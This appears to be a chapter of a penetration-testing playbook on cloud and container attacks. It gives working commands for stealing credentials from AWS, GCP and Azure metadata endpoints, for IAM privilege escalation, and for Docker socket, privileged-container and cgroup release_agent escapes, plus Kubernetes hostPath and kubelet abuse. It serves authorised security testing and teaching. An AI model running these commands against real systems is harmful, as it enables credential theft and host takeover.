# 13. Cloud & Containers

**When:** Operating inside or at the perimeter of AWS, GCP, Azure, Kubernetes clusters, or Docker container environments.

## Mental model
Cloud infrastructure is governed by **identity policies (IAM) and metadata trust boundaries**, while containerization relies on **Linux kernel isolation primitives (namespaces, cgroups, seccomp)**. Compromise is either **expanding an IAM identity upward** or **breaking container namespace isolation to control the underlying node/host**.

## Attack arc
- **Cloud Metadata & Credential Exfiltration:**
  - *AWS IMDS:* Query `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` (IMDSv1). For IMDSv2, send `PUT` with `X-aws-ec2-metadata-token-ttl-seconds: 21600` to get token, then pass `X-aws-ec2-metadata-token: <token>`.
  - *GCP Metadata:* Query `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` with header `Metadata-Flavor: Google`.
  - *Azure IMDS:* Query `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/` with header `Metadata: true`.
- **IAM Permission Escalation (AWS / GCP / Azure):**
  - Enumerate effective permissions (`aws sts get-caller-identity`, `prowler`, `pacu`).
  - *AWS Escalation Vectors:* `iam:PassRole` + `lambda:CreateFunction` / `ec2:RunInstances`, `iam:CreateAccessKey`, `sts:AssumeRole` with overly broad trust policies, `s3:GetObject` on secret buckets.
- **Container Escape Primitives (Docker / Containerd):**
  - *Exposed Docker Socket:* If `/var/run/docker.sock` is mounted:
    `docker run -v /:/host --rm -it alpine chroot /host` to take full host control.
  - *Privileged Container (`--privileged`):*
    Mount host devices directly (`mkdir /tmp/host && mount /dev/sda1 /tmp/host`) or execute commands on the host via cgroup v1 `release_agent`.
  - *Dangerous Capabilities:* `CAP_SYS_ADMIN` (inject into cgroups), `CAP_SYS_PTRACE` (inject shellcode into host processes), `CAP_SYS_MODULE` (load rootkit kernel module).
- **Kubernetes (K8s) Cluster Exploitation:**
  - Locate ServiceAccount token: `/var/run/secrets/kubernetes.io/serviceaccount/token`.
  - Check permissions via `kubectl --token=<token> auth can-i --list`.
  - *Privilege Escalation:* If `create pods` or `create daemonsets` is granted, deploy a pod mounting `/` from the host node (`hostPath: {path: /}`).
  - *Kubelet / API Access:* Query unauthenticated Kubelet read-only ports (`10255`) or authenticated ports (`10250/pods`, `10250/run`) if anonymous auth is enabled.

## Key techniques & primitives
- **Cgroup v1 Release Agent Escape:**
  `mkdir /tmp/cgrp && mount -t cgroup -o memory cgroup /tmp/cgrp && mkdir /tmp/cgrp/x && echo 1 > /tmp/cgrp/x/notify_on_release && echo "/cmd.sh" > /tmp/cgrp/release_agent # trigger by releasing empty cgroup`.
- **IMDSv2 via SSRF:** If an SSRF cannot send `PUT` headers, look for open reverse proxies, local file inclusions, or header injection vectors.

## Tells & signals
- `/.dockerenv` or `/run/secrets/kubernetes.io` present on the filesystem.
- `cat /proc/1/cgroup` showing container IDs or slice hierarchies.
- SSRF vulnerabilities in web apps hosted on EC2/GCE = immediate IMDS credential harvest.
